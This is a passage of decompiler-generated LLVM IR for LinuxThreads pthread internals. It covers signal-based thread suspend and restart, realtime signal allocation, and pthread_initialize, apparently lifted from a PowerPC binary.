  %v2_10013c48 = trunc i32 %v3_10013c44 to i8
  %v3_10013c48 = call i32 @__GI_pthread_setcanceltype(i8 %v2_10013c48, i32 0)
  ret i32 %v1_10013c38

; uselistorder directives
  uselistorder i32 (i8, i32)* @__GI_pthread_setcanceltype, { 44, 45, 34, 35, 0, 1, 2, 3, 4, 5, 6, 7, 52, 53, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 38, 39, 22, 23, 24, 25, 32, 33, 50, 51, 46, 47, 42, 43, 48, 49, 26, 27, 28, 29, 36, 37, 30, 31, 40, 41 }
}

define i32 @__libc_current_sigrtmin() local_unnamed_addr {
entry:
  %v3_10013c68 = load i32, i32* getelementptr inbounds ([3 x i32], [3 x i32]* @global_var_10040d38.978, i32 0, i32 0), align 4
  ret i32 %v3_10013c68
}

define i32 @__libc_current_sigrtmax() local_unnamed_addr {
entry:
  %v3_10013c74 = load i32, i32* @global_var_10040d3c.979, align 4
  ret i32 %v3_10013c74
}

define i32 @__libc_allocate_rtsig(i32 %arg1) local_unnamed_addr {
entry:
  %v3_10013c84 = load i32, i32* getelementptr inbounds ([3 x i32], [3 x i32]* @global_var_10040d38.978, i32 0, i32 0), align 4
  %v3_10013c88 = icmp eq i32 %v3_10013c84, -1
  br i1 %v3_10013c88, label %dec_label_pc_10013cc0, label %dec_label_pc_10013c90

dec_label_pc_10013c90:                            ; preds = %entry
  %v3_10013c90 = load i32, i32* @global_var_10040d3c.979, align 4
  %v3_10013c98 = icmp sgt i32 %v3_10013c84, %v3_10013c90
  br i1 %v3_10013c98, label %dec_label_pc_10013cc0, label %dec_label_pc_10013ca0

dec_label_pc_10013ca0:                            ; preds = %dec_label_pc_10013c90
  %v3_10013c94 = icmp eq i32 %arg1, 0
  br i1 %v3_10013c94, label %dec_label_pc_10013cb4, label %dec_label_pc_10013cac

dec_label_pc_10013cac:                            ; preds = %dec_label_pc_10013ca0
  %v1_10013ca0 = add i32 %v3_10013c84, 1
  store i32 %v1_10013ca0, i32* getelementptr inbounds ([3 x i32], [3 x i32]* @global_var_10040d38.978, i32 0, i32 0), align 4
  br label %dec_label_pc_10013cc4

dec_label_pc_10013cb4:                            ; preds = %dec_label_pc_10013ca0
  %v1_10013ca4 = add i32 %v3_10013c90, -1
  store i32 %v1_10013ca4, i32* @global_var_10040d3c.979, align 4
  br label %dec_label_pc_10013cc4

dec_label_pc_10013cc0:                            ; preds = %dec_label_pc_10013c90, %entry
  br label %dec_label_pc_10013cc4

dec_label_pc_10013cc4:                            ; preds = %dec_label_pc_10013cb4, %dec_label_pc_10013cac, %dec_label_pc_10013cc0
  %v0_10013cc4 = phi i32 [ %v3_10013c90, %dec_label_pc_10013cb4 ], [ %v3_10013c84, %dec_label_pc_10013cac ], [ -1, %dec_label_pc_10013cc0 ]
  ret i32 %v0_10013cc4

; uselistorder directives
  uselistorder label %dec_label_pc_10013cc4, { 2, 0, 1 }
}

define i32 @__GI_pthread_self() local_unnamed_addr {
entry:
  %v0_10013ccc = load i32, i32* @r2, align 4
  %v1_10013ccc = add i32 %v0_10013ccc, 16
  %v2_10013ccc = inttoptr i32 %v1_10013ccc to i32*
  %v3_10013ccc = load i32, i32* %v2_10013ccc, align 4
  ret i32 %v3_10013ccc
}

define i32 @pthread_equal(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @pthread_handle_sigdebug() local_unnamed_addr {
entry:
  %v0_10013ce4 = load i32, i32* @r3, align 4
  ret i32 %v0_10013ce4
}

define i32 @__pthread_setconcurrency(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @global_var_100451d4.980, align 4
  ret i32 0
}

define i32 @__pthread_getconcurrency() local_unnamed_addr {
entry:
  %v3_10013cfc = load i32, i32* @global_var_100451d4.980, align 4
  ret i32 %v3_10013cfc
}

define i32 @__pthread_timedsuspend_new(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-904 = alloca i32, align 4
  %stack_var_-760 = alloca i32, align 4
  %stack_var_-888 = alloca i32, align 4
  %stack_var_-624 = alloca i32, align 4
  store i32 1, i32* @r4, align 4
  store i32 268516648, i32* @lr, align 4
  %v3_10013d24 = call i32 @__sigsetjmp(i32* nonnull %stack_var_-624, i32 1)
  %v3_10013d28 = icmp eq i32 %v3_10013d24, 0
  store i32 1, i32* %r9.global-to-local, align 4
  br i1 %v3_10013d28, label %dec_label_pc_10013d34, label %entry.dec_label_pc_10013df4_crit_edge

entry.dec_label_pc_10013df4_crit_edge:            ; preds = %entry
  %.pre = add i32 %arg1, 36
  %.pre1 = inttoptr i32 %.pre to i32*
  br label %dec_label_pc_10013df4

dec_label_pc_10013d34:                            ; preds = %entry
  %v2_10013d10 = ptrtoint i32* %stack_var_-624 to i32
  store i32 %arg1, i32* %r9.global-to-local, align 4
  %v2_10013d3c = ptrtoint i32* %stack_var_-888 to i32
  store i32 %v2_10013d3c, i32* @r29, align 4
  %v2_10013d40 = add i32 %arg1, 36
  %v3_10013d40 = inttoptr i32 %v2_10013d40 to i32*
  store i32 %v2_10013d10, i32* %v3_10013d40, align 4
  %v1_10013d44 = load i32, i32* %r9.global-to-local, align 4
  %v2_10013d44 = add i32 %v1_10013d44, 32
  %v3_10013d44 = inttoptr i32 %v2_10013d44 to i32*
  store i32 0, i32* %v3_10013d44, align 4
  store i32 %v2_10013d3c, i32* @r3, align 4
  store i32 268516688, i32* @lr, align 4
  %v1_10013d4c = call i32 @sigemptyset(i32 %v2_10013d3c)
  store i32 268697600, i32* %r9.global-to-local, align 4
  %v3_10013d54 = load i32, i32* @global_var_100450e4.981, align 4
  store i32 %v2_10013d3c, i32* @r3, align 4
  store i32 268516704, i32* @lr, align 4
  %v2_10013d5c = call i32 @__GI_sigaddset(i32 %v2_10013d3c, i32 %v3_10013d54)
  %v2_10013d68 = ptrtoint i32* %stack_var_-760 to i32
  store i32 268516720, i32* @lr, align 4
  %v3_10013d6c = call i32 @__GI_sigprocmask(i32 1, i32 %v2_10013d3c, i32 %v2_10013d68)
  %v2_10013d74 = ptrtoint i32* %stack_var_-904 to i32
  %v1_10013d8c = add i32 %tmp, 4
  %v2_10013d8c = inttoptr i32 %v1_10013d8c to i32*
  br label %dec_label_pc_10013d70

dec_label_pc_10013d70:                            ; preds = %dec_label_pc_10013dd4, %dec_label_pc_10013d34
  store i32 268516732, i32* @lr, align 4
  %v2_10013d78 = call i32 @gettimeofday(i32 %v2_10013d74, i32 0)
  store i32 %tmp, i32* %r9.global-to-local, align 4
  %v3_10013d8c = load i32, i32* %v2_10013d8c, align 4
  %v2_10013d94 = load i32, i32* %arg2, align 4
  %tmp16 = mul i32 %tmp4, -1000
  %v2_10013d98 = add i32 %v3_10013d8c, %tmp16
  store i32 %v2_10013d98, i32* @r11, align 4
  %v3_10013d9c = load i32, i32* %stack_var_-904, align 4
  %v2_10013db0 = sub i32 %v2_10013d94, %v3_10013d9c
  store i32 %v2_10013db0, i32* %r9.global-to-local, align 4
  %not.tmp15 = icmp slt i32 %v2_10013d98, 0
  %v1_10013db4 = sext i1 %not.tmp15 to i32
  %v2_10013db0.v1_10013db4 = add i32 %v2_10013db0, %v1_10013db4
  %v1_10013dcc = icmp slt i32 %v2_10013db0.v1_10013db4, 0
  br i1 %v1_10013dcc, label %dec_label_pc_10013de0, label %dec_label_pc_10013dd4

dec_label_pc_10013dd4:                            ; preds = %dec_label_pc_10013d70
  store i32 268516824, i32* @lr, align 4
  %v0_10013dd4 = call i32 @__libc_nanosleep()
  %v3_10013dd8 = icmp eq i32 %v0_10013dd4, 0
  br i1 %v3_10013dd8, label %dec_label_pc_10013de0, label %dec_label_pc_10013d70

dec_label_pc_10013de0:                            ; preds = %dec_label_pc_10013dd4, %dec_label_pc_10013d70
  store i32 ptrtoint ([3 x i8]* @global_var_10013df0.982 to i32), i32* @lr, align 4
  %v3_10013dec = call i32 @__GI_sigprocmask(i32 2, i32 %v2_10013d68, i32 0)
  store i32 0, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10013df4

dec_label_pc_10013df4:                            ; preds = %entry.dec_label_pc_10013df4_crit_edge, %dec_label_pc_10013de0
  %v3_10013dfc.pre-phi = phi i32* [ %.pre1, %entry.dec_label_pc_10013df4_crit_edge ], [ %v3_10013d40, %dec_label_pc_10013de0 ]
  store i32 %arg1, i32* @r10, align 4
  store i32 0, i32* %v3_10013dfc.pre-phi, align 4
  %v0_10013e08 = load i32, i32* %r9.global-to-local, align 4
  ret i32 %v0_10013e08

; uselistorder directives
  uselistorder i32 %v2_10013d98, { 1, 0 }
  uselistorder i32 %v2_10013d3c, { 0, 2, 1, 4, 3, 5 }
  uselistorder i32* %stack_var_-624, { 1, 0 }
  uselistorder i32* %r9.global-to-local, { 6, 0, 1, 2, 5, 3, 4, 7 }
  uselistorder i32 ()* @__libc_nanosleep, { 1, 0 }
  uselistorder i32 %arg1, { 1, 3, 2, 0 }
  uselistorder label %dec_label_pc_10013df4, { 1, 0 }
}

define i32 @__pthread_restart_new() local_unnamed_addr {
entry:
  %v0_10013e30 = load i32, i32* @r3, align 4
  %v1_10013e30 = add i32 %v0_10013e30, 20
  %v2_10013e30 = inttoptr i32 %v1_10013e30 to i32*
  %v3_10013e30 = load i32, i32* %v2_10013e30, align 4
  %v3_10013e34 = load i32, i32* @global_var_100450e4.981, align 4
  store i32 268516924, i32* @lr, align 4
  %v2_10013e38 = call i32 @kill(i32 %v3_10013e30, i32 %v3_10013e34)
  ret i32 %v2_10013e38
}

define i32 @__pthread_wait_for_restart_signal() local_unnamed_addr {
entry:
  %stack_var_-152 = alloca i32, align 4
  %v2_10013e5c = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_10013e5c, i32* @r29, align 4
  %v0_10013e60 = load i32, i32* @r3, align 4
  store i32 %v0_10013e60, i32* @r31, align 4
  store i32 268516980, i32* @lr, align 4
  %v3_10013e70 = call i32 @__GI_sigprocmask(i32 2, i32 0, i32 %v2_10013e5c)
  store i32 %v2_10013e5c, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_10013e84.983 to i32), i32* @lr, align 4
  %v1_10013e80 = call i32 @__GI_sigdelset(i32 %v2_10013e5c)
  %v1_10013e88 = load i32, i32* @r31, align 4
  %v2_10013e88 = add i32 %v1_10013e88, 32
  %v3_10013e88 = inttoptr i32 %v2_10013e88 to i32*
  store i32 0, i32* %v3_10013e88, align 4
  br label %dec_label_pc_10013e8c

dec_label_pc_10013e8c:                            ; preds = %dec_label_pc_10013e8c, %entry
  store i32 268517012, i32* @lr, align 4
  %v1_10013e90 = call i32 @__libc_sigsuspend(i32 %v2_10013e5c)
  %v3_10013e98 = load i32, i32* @global_var_100450e4.981, align 4
  store i32 %v3_10013e98, i32* @r9, align 4
  %v0_10013e9c = load i32, i32* @r31, align 4
  %v1_10013e9c = add i32 %v0_10013e9c, 32
  %v2_10013e9c = inttoptr i32 %v1_10013e9c to i32*
  %v3_10013e9c = load i32, i32* %v2_10013e9c, align 4
  %v4_10013ea0 = icmp eq i32 %v3_10013e9c, %v3_10013e98
  br i1 %v4_10013ea0, label %dec_label_pc_10013ea8, label %dec_label_pc_10013e8c

dec_label_pc_10013ea8:                            ; preds = %dec_label_pc_10013e8c
  ret i32 %v1_10013e90

; uselistorder directives
  uselistorder i32 %v2_10013e5c, { 1, 3, 2, 0, 4 }
}

define i32 @suspend(i32 %arg1) local_unnamed_addr {
entry:
  %v0_10013ec0 = call i32 @__pthread_wait_for_restart_signal()
  ret i32 %v0_10013ec0
}

define i32 @pthread_onexit_process(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-168 = alloca i32, align 4
  %v0_10013ed4 = load i32, i32* @r2, align 4
  store i32 %v0_10013ed4, i32* @r31, align 4
  %v3_10013edc = load i32, i32* @global_var_100450c4.984, align 4
  %v1_10013ee0 = icmp slt i32 %v3_10013edc, 0
  br i1 %v1_10013ee0, label %entry.dec_label_pc_10013f64_crit_edge, label %dec_label_pc_10013ee8

entry.dec_label_pc_10013f64_crit_edge:            ; preds = %entry
  %v0_10013f74.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10013f64

dec_label_pc_10013ee8:                            ; preds = %entry
  store i32 %v0_10013ed4, i32* %stack_var_-168, align 4
  %v2_10013efc = ptrtoint i32* %stack_var_-168 to i32
  store i32 %v3_10013edc, i32* %r3.global-to-local, align 4
  store i32 268517132, i32* @lr, align 4
  %v2_10013f089 = call i32 @__libc_write(i32 %v3_10013edc, i32 %v2_10013efc)
  store i32 %v2_10013f089, i32* %r3.global-to-local, align 4
  %v3_10013f0c12 = icmp eq i32 %v2_10013f089, -1
  br i1 %v3_10013f0c12, label %dec_label_pc_10013f14, label %dec_label_pc_10013f24

dec_label_pc_10013f14:                            ; preds = %dec_label_pc_10013ee8, %dec_label_pc_10013f14.dec_label_pc_10013ef8_crit_edge
  %v0_10013f14 = call i32 @__errno_location()
  store i32 %v0_10013f14, i32* %r3.global-to-local, align 4
  %v1_10013f18 = inttoptr i32 %v0_10013f14 to i32*
  %v2_10013f18 = load i32, i32* %v1_10013f18, align 4
  %v3_10013f1c = icmp eq i32 %v2_10013f18, 4
  br i1 %v3_10013f1c, label %dec_label_pc_10013f14.dec_label_pc_10013ef8_crit_edge, label %dec_label_pc_10013f24

dec_label_pc_10013f14.dec_label_pc_10013ef8_crit_edge: ; preds = %dec_label_pc_10013f14
  %v3_10013f00.pre = load i32, i32* @global_var_100450c4.984, align 4
  store i32 %v3_10013f00.pre, i32* %r3.global-to-local, align 4
  store i32 268517132, i32* @lr, align 4
  %v2_10013f08 = call i32 @__libc_write(i32 %v3_10013f00.pre, i32 %v2_10013efc)
  store i32 %v2_10013f08, i32* %r3.global-to-local, align 4
  %v3_10013f0c = icmp eq i32 %v2_10013f08, -1
  br i1 %v3_10013f0c, label %dec_label_pc_10013f14, label %dec_label_pc_10013f24

dec_label_pc_10013f24:                            ; preds = %dec_label_pc_10013f14, %dec_label_pc_10013f14.dec_label_pc_10013ef8_crit_edge, %dec_label_pc_10013ee8
  %v0_10013f24 = load i32, i32* @r31, align 4
  store i32 %v0_10013f24, i32* @r3, align 4
  store i32 268517164, i32* @lr, align 4
  %v1_10013f28 = call i32 @suspend(i32 %v0_10013f24)
  store i32 %v1_10013f28, i32* %r3.global-to-local, align 4
  %v3_10013f30 = load i32, i32* inttoptr (i32 268718272 to i32*), align 64
  %v0_10013f34 = load i32, i32* @r31, align 4
  %v4_10013f34 = icmp eq i32 %v0_10013f34, %v3_10013f30
  br i1 %v4_10013f34, label %dec_label_pc_10013f3c, label %dec_label_pc_10013f64

dec_label_pc_10013f3c:                            ; preds = %dec_label_pc_10013f24
  %v3_10013f44 = load i32, i32* @global_var_10040ab4.985, align 4
  store i32 %v3_10013f44, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10013f50.986 to i32), i32* @lr, align 4
  %v3_10013f4c = call i32 @waitpid(i32 %v3_10013f44, i32 0, i32 -2147483648)
  store i32 %v3_10013f4c, i32* %r3.global-to-local, align 4
  store i32 0, i32* @global_var_100451c0.987, align 4
  store i32 0, i32* @global_var_100451c4.988, align 4
  br label %dec_label_pc_10013f64

dec_label_pc_10013f64:                            ; preds = %entry.dec_label_pc_10013f64_crit_edge, %dec_label_pc_10013f24, %dec_label_pc_10013f3c
  %v0_10013f74 = phi i32 [ %v0_10013f74.pre, %entry.dec_label_pc_10013f64_crit_edge ], [ %v1_10013f28, %dec_label_pc_10013f24 ], [ %v3_10013f4c, %dec_label_pc_10013f3c ]
  ret i32 %v0_10013f74

; uselistorder directives
  uselistorder i32 %v2_10013efc, { 1, 0 }
  uselistorder i32* %stack_var_-168, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 6, 7, 5, 9, 8, 0, 1 }
  uselistorder i32 268517132, { 1, 0 }
  uselistorder label %dec_label_pc_10013f64, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10013f24, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10013f14, { 1, 0 }
}

define i32 @__pthread_reset_main_thread() local_unnamed_addr {
entry:
  %r9.global-to-local = alloca i32, align 4
  %v3_10013f90 = load i32, i32* @global_var_100450c4.984, align 4
  %v0_10013f98 = load i32, i32* @r2, align 4
  store i32 %v0_10013f98, i32* @r31, align 4
  store i32 -1, i32* @r29, align 4
  %v3_10013fa0 = icmp eq i32 %v3_10013f90, -1
  br i1 %v3_10013fa0, label %dec_label_pc_10013fd8, label %dec_label_pc_10013fa8

dec_label_pc_10013fa8:                            ; preds = %entry
  %v3_10013fa8 = load i32, i32* @global_var_100451c0.987, align 4
  store i32 %v3_10013fa8, i32* @r3, align 4
  store i32 268517296, i32* @lr, align 4
  %v0_10013fac = call i32 @free()
  %v3_10013fb0 = load i32, i32* @global_var_100450c4.984, align 4
  store i32 268697600, i32* %r9.global-to-local, align 4
  store i32 0, i32* @global_var_100451c0.987, align 4
  store i32 0, i32* @global_var_100451c4.988, align 4
  store i32 268517320, i32* @lr, align 4
  %v1_10013fc4 = call i32 @__libc_close(i32 %v3_10013fb0)
  %v3_10013fc8 = load i32, i32* @global_var_100451dc.989, align 4
  store i32 268517328, i32* @lr, align 4
  %v1_10013fcc = call i32 @__libc_close(i32 %v3_10013fc8)
  %v0_10013fd0 = load i32, i32* @r29, align 4
  store i32 %v0_10013fd0, i32* @global_var_100450c4.984, align 4
  store i32 %v0_10013fd0, i32* @global_var_100451dc.989, align 4
  br label %dec_label_pc_10013fd8

dec_label_pc_10013fd8:                            ; preds = %entry, %dec_label_pc_10013fa8
  store i32 268517340, i32* @lr, align 4
  %v0_10013fd8 = call i32 @__libc_getpid()
  %v1_10013fe0 = load i32, i32* @r31, align 4
  %v2_10013fe0 = add i32 %v1_10013fe0, 20
  %v3_10013fe0 = inttoptr i32 %v2_10013fe0 to i32*
  store i32 %v0_10013fd8, i32* %v3_10013fe0, align 4
  %v0_10013fe4 = load i32, i32* @r31, align 4
  store i32 %v0_10013fe4, i32* @global_var_100450c0, align 4
  store i32 ptrtoint (i32* @global_var_10045210.990 to i32), i32* %r9.global-to-local, align 4
  %v2_10013ff0 = inttoptr i32 %v0_10013fe4 to i32*
  store i32 %v0_10013fe4, i32* %v2_10013ff0, align 4
  %v0_10013ff4 = load i32, i32* %r9.global-to-local, align 4
  %v1_10013ff4 = load i32, i32* @r31, align 4
  %v2_10013ff4 = add i32 %v1_10013ff4, 76
  %v3_10013ff4 = inttoptr i32 %v2_10013ff4 to i32*
  store i32 %v0_10013ff4, i32* %v3_10013ff4, align 4
  store i32 ptrtoint (i32* @global_var_1004520c.991 to i32), i32* %r9.global-to-local, align 4
  %v0_10014000 = load i32, i32* @r31, align 4
  %v2_10014000 = add i32 %v0_10014000, 4
  %v3_10014000 = inttoptr i32 %v2_10014000 to i32*
  store i32 %v0_10014000, i32* %v3_10014000, align 4
  %v0_10014004 = load i32, i32* %r9.global-to-local, align 4
  %v1_10014004 = load i32, i32* @r31, align 4
  %v2_10014004 = add i32 %v1_10014004, 68
  %v3_10014004 = inttoptr i32 %v2_10014004 to i32*
  store i32 %v0_10014004, i32* %v3_10014004, align 4
  ret i32 %v0_10013fd8

; uselistorder directives
  uselistorder i32 %v0_10014000, { 1, 0 }
  uselistorder i32 %v0_10013fe4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10013fd8, { 1, 0 }
}

define i32 @__pthread_kill_other_threads_np() local_unnamed_addr {
entry:
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-164 = alloca i32, align 4
  store i32 268517432, i32* @lr, align 4
  %v2_10014034 = call i32 @pthread_onexit_process(i32 0, i32 0)
  store i32 ptrtoint ([3 x i8]* @global_var_1001403c.992 to i32), i32* @lr, align 4
  %v0_10014038 = call i32 @__pthread_reset_main_thread()
  %v2_1001403c = ptrtoint i32* %stack_var_-164 to i32
  store i32 %v2_1001403c, i32* @r3, align 4
  store i32 268517444, i32* @lr, align 4
  %v1_10014040 = call i32 @sigemptyset(i32 %v2_1001403c)
  %v3_10014048 = load i32, i32* @global_var_100450e4.981, align 4
  store i32 0, i32* %stack_var_-168, align 4
  store i32 268517480, i32* @lr, align 4
  %v4_10014064 = call i32 @__libc_sigaction(i32 %v3_10014048, i32* nonnull %stack_var_-168, i32 0)
  %v3_10014070 = load i32, i32* @global_var_100450e8.993, align 4
  store i32 268517500, i32* @lr, align 4
  %v4_10014078 = call i32 @__libc_sigaction(i32 %v3_10014070, i32* nonnull %stack_var_-168, i32 0)
  %v3_10014080 = load i32, i32* @global_var_100450ec.994, align 4
  %tmp7 = icmp slt i32 %v3_10014080, 1
  br i1 %tmp7, label %dec_label_pc_1001409c, label %dec_label_pc_10014098

dec_label_pc_10014098:                            ; preds = %entry
  store i32 268517532, i32* @lr, align 4
  %v4_10014098 = call i32 @__libc_sigaction(i32 %v3_10014080, i32* nonnull %stack_var_-168, i32 0)
  br label %dec_label_pc_1001409c

dec_label_pc_1001409c:                            ; preds = %entry, %dec_label_pc_10014098
  %v0_100140ac = phi i32 [ %v3_10014080, %entry ], [ %v4_10014098, %dec_label_pc_10014098 ]
  ret i32 %v0_100140ac

; uselistorder directives
  uselistorder i32 ()* @__pthread_reset_main_thread, { 1, 0 }
  uselistorder label %dec_label_pc_1001409c, { 1, 0 }
}

define i32 @pthread_initialize(i32 %arg1) local_unnamed_addr {
entry:
  %r10.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %stack_var_-304 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-172 = alloca i32, align 4
  %stack_var_-312 = alloca i32, align 4
  %stack_var_-4194624 = alloca i32, align 4
  %v3_100140c4 = load i32, i32* @global_var_100451bc.995, align 4
  store i32 %v3_100140c4, i32* @r31, align 4
  %v3_100140c8 = icmp eq i32 %v3_100140c4, 0
  br i1 %v3_100140c8, label %dec_label_pc_100140d0, label %dec_label_pc_1001426c

dec_label_pc_100140d0:                            ; preds = %entry
  %v2_100140d0 = ptrtoint i32* %stack_var_-4194624 to i32
  %v1_100140d4 = call i32 @__asm_rlwinm(i32 %v2_100140d0, i32 0, i32 0, i32 10)
  store i32 %v1_100140d4, i32* @global_var_100451bc.995, align 4
  store i32 268517600, i32* @lr, align 4
  %v0_100140dc = call i32 @__libc_getpid()
  %v3_100140e8 = load i32, i32* bitcast (i32** @global_var_10045128.997 to i32*), align 4
  store i32 %v3_100140e8, i32* %r29.global-to-local, align 4
  %v0_100140f4 = load i32, i32* @r31, align 4
  store i32 %v0_100140f4, i32* @global_var_1004512c.998, align 4
  store i32 ptrtoint (i32* @global_var_100408c0 to i32), i32* @r2, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1004520c.991 to i32), i32* bitcast (i32** @global_var_10040904.999 to i32*), align 4
  store i32 %v0_100140dc, i32* @global_var_100408d4.1000, align 4
  store i32 ptrtoint (i32* @global_var_10045210.990 to i32), i32* bitcast (i32** @global_var_1004090c.1001 to i32*), align 4
  %v3_100141344 = icmp eq i32 %v3_100140e8, 0
  br i1 %v3_100141344, label %dec_label_pc_1001413c, label %dec_label_pc_10014120

dec_label_pc_10014120:                            ; preds = %dec_label_pc_100140d0, %dec_label_pc_10014130
  %v1_1001412c = phi i32 [ %v3_10014130, %dec_label_pc_10014130 ], [ %v3_100140e8, %dec_label_pc_100140d0 ]
  %v1_10014120 = add i32 %v1_1001412c, 52
  %v2_10014120 = inttoptr i32 %v1_10014120 to i32*
  %v3_10014120 = load i32, i32* %v2_10014120, align 4
  %v3_10014124 = icmp eq i32 %v3_10014120, 1
  br i1 %v3_10014124, label %dec_label_pc_10014130, label %dec_label_pc_1001412c

dec_label_pc_1001412c:                            ; preds = %dec_label_pc_10014120
  %v0_1001412c = load i32, i32* %r10.global-to-local, align 4
  store i32 %v0_1001412c, i32* %v2_10014120, align 4
  %v0_10014130.pre = load i32, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_10014130

dec_label_pc_10014130:                            ; preds = %dec_label_pc_10014120, %dec_label_pc_1001412c
  %v0_10014130 = phi i32 [ %v1_1001412c, %dec_label_pc_10014120 ], [ %v0_10014130.pre, %dec_label_pc_1001412c ]
  %v1_10014130 = add i32 %v0_10014130, 32
  %v2_10014130 = inttoptr i32 %v1_10014130 to i32*
  %v3_10014130 = load i32, i32* %v2_10014130, align 4
  store i32 %v3_10014130, i32* %r29.global-to-local, align 4
  %v3_10014134 = icmp eq i32 %v3_10014130, 0
  br i1 %v3_10014134, label %dec_label_pc_10014134.dec_label_pc_1001413c_crit_edge, label %dec_label_pc_10014120

dec_label_pc_10014134.dec_label_pc_1001413c_crit_edge: ; preds = %dec_label_pc_10014130
  br label %dec_label_pc_1001413c

dec_label_pc_1001413c:                            ; preds = %dec_label_pc_10014134.dec_label_pc_1001413c_crit_edge, %dec_label_pc_100140d0
  %v2_1001413c = ptrtoint i32* %stack_var_-312 to i32
  store i32 ptrtoint (i32* @global_var_1001414c.1002 to i32), i32* @lr, align 4
  %v2_10014148 = call i32 @getrlimit(i32 3, i32 %v2_1001413c)
  store i32 ptrtoint (i32* @global_var_10014150.1003 to i32), i32* @lr, align 4
  %v0_1001414c = call i32 @__GI_getpagesize()
  %tmp = mul i32 %v0_1001414c, -2
  %v2_10014158 = add i32 %tmp, 2097152
  %v3_1001415c = load i32, i32* %stack_var_-312, align 4
  %v3_10014160 = icmp ugt i32 %v3_1001415c, %v2_10014158
  br i1 %v3_10014160, label %dec_label_pc_10014168, label %dec_label_pc_10014178

dec_label_pc_10014168:                            ; preds = %dec_label_pc_1001413c
  store i32 %v2_10014158, i32* %stack_var_-312, align 4
  store i32 268517752, i32* @lr, align 4
  %v3_10014174 = call i32 @__GI_setrlimit(i32 3, i32 %v2_1001413c, i32 %v2_10014158)
  br label %dec_label_pc_10014178

dec_label_pc_10014178:                            ; preds = %dec_label_pc_1001413c, %dec_label_pc_10014168
  %v2_10014178 = ptrtoint i32* %stack_var_-172 to i32
  store i32 %v2_10014178, i32* @r3, align 4
  store i32 268519140, i32* %stack_var_-176, align 4
  store i32 268517780, i32* @lr, align 4
  %v1_10014190 = call i32 @sigemptyset(i32 %v2_10014178)
  %v3_10014194 = load i32, i32* @global_var_100450e4.981, align 4
  store i32 268517804, i32* @lr, align 4
  %v4_100141a8 = call i32 @__libc_sigaction(i32 %v3_10014194, i32* nonnull %stack_var_-176, i32 0)
  %v3_100141ac = load i32, i32* @global_var_100450e4.981, align 4
  store i32 %v2_10014178, i32* @r3, align 4
  store i32 268697600, i32* @r27, align 4
  store i32 268518848, i32* %stack_var_-176, align 4
  store i32 268517832, i32* @lr, align 4
  %v2_100141c4 = call i32 @__GI_sigaddset(i32 %v2_10014178, i32 %v3_100141ac)
  %v3_100141c8 = load i32, i32* @global_var_100450e8.993, align 4
  store i32 268697600, i32* %r29.global-to-local, align 4
  store i32 268517852, i32* @lr, align 4
  %v4_100141d8 = call i32 @__libc_sigaction(i32 %v3_100141c8, i32* nonnull %stack_var_-176, i32 0)
  %v3_100141dc = load i32, i32* @global_var_100450ec.994, align 4
  %tmp15 = icmp slt i32 %v3_100141dc, 1
  br i1 %tmp15, label %dec_label_pc_1001420c, label %dec_label_pc_100141e8

dec_label_pc_100141e8:                            ; preds = %dec_label_pc_10014178
  store i32 %v2_10014178, i32* @r3, align 4
  store i32 268516580, i32* %stack_var_-176, align 4
  store i32 268517884, i32* @lr, align 4
  %v1_100141f8 = call i32 @sigemptyset(i32 %v2_10014178)
  %v3_100141fc = load i32, i32* @global_var_100450ec.994, align 4
  store i32 268517900, i32* @lr, align 4
  %v4_10014208 = call i32 @__libc_sigaction(i32 %v3_100141fc, i32* nonnull %stack_var_-176, i32 0)
  br label %dec_label_pc_1001420c

dec_label_pc_1001420c:                            ; preds = %dec_label_pc_10014178, %dec_label_pc_100141e8
  %v2_1001420c = ptrtoint i32* %stack_var_-304 to i32
  store i32 %v2_1001420c, i32* %r29.global-to-local, align 4
  store i32 %v2_1001420c, i32* @r3, align 4
  store i32 268517912, i32* @lr, align 4
  %v1_10014214 = call i32 @sigemptyset(i32 %v2_1001420c)
  %v3_10014218 = load i32, i32* @global_var_100450e4.981, align 4
  store i32 %v2_1001420c, i32* @r3, align 4
  store i32 268517924, i32* @lr, align 4
  %v2_10014220 = call i32 @__GI_sigaddset(i32 %v2_1001420c, i32 %v3_10014218)
  store i32 268517940, i32* @lr, align 4
  %v3_10014230 = call i32 @__GI_sigprocmask(i32 0, i32 %v2_1001420c, i32 0)
  store i32 %v2_1001420c, i32* @r3, align 4
  store i32 268517952, i32* @lr, align 4
  %v1_1001423c = call i32 @__GI_sigdelset(i32 %v2_1001420c)
  %v3_10014240 = load i32, i32* @global_var_100450e8.993, align 4
  store i32 %v2_1001420c, i32* @r3, align 4
  store i32 268517964, i32* @lr, align 4
  %v2_10014248 = call i32 @__GI_sigaddset(i32 %v2_1001420c, i32 %v3_10014240)
  store i32 268517980, i32* @lr, align 4
  %v3_10014258 = call i32 @__GI_sigprocmask(i32 1, i32 %v2_1001420c, i32 0)
  store i32 268517996, i32* @lr, align 4
  %v2_10014268 = call i32 @on_exit(i32 268517060, i32 0)
  br label %dec_label_pc_1001426c

dec_label_pc_1001426c:                            ; preds = %entry, %dec_label_pc_1001420c
  %.0 = phi i32 [ %v2_10014268, %dec_label_pc_1001420c ], [ undef, %entry ]
  ret i32 %.0

; uselistorder directives
